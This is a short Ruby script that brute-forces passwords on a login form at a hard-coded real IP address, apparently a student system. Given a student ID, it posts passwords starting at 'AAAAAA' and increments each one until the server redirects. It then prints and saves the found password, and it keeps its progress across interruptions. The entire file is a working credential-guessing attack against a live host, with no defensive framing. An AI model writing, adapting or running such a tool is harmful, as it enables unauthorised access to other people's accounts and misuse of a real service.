#! /usr/bin/env ruby
require 'net/http'

uri1 = URI('http://202.207.177.15:7777/pls/wwwbks/bks_login2.login')
req1 = Net::HTTP::Post.new(uri1.path)

stuid = ARGV[0]
pwd = "AAAAAA"

Signal.trap("INT") do 
  puts pwd
  File.open(stuid,"w") {|f| f << pwd}
  exit
end

if not File.exist?(stuid)
  File.open(stuid ,"w") do |f|
    f << pwd
  end
else
  File.open(stuid) do |f|
    pwd = f.read.chomp!
  end
end

Net::HTTP.start(uri1.hostname, uri1.port) do |http|
  loop do
    req1.set_form_data('stuid' => stuid, 'pwd' => pwd)
    if http.request(req1).is_a? Net::HTTPRedirection
      puts "your passwd is #{pwd}"
      File.open(stuid + "p", "w") {|f| f << pwd}
      break
    end
    pwd = pwd.next
  end 
end

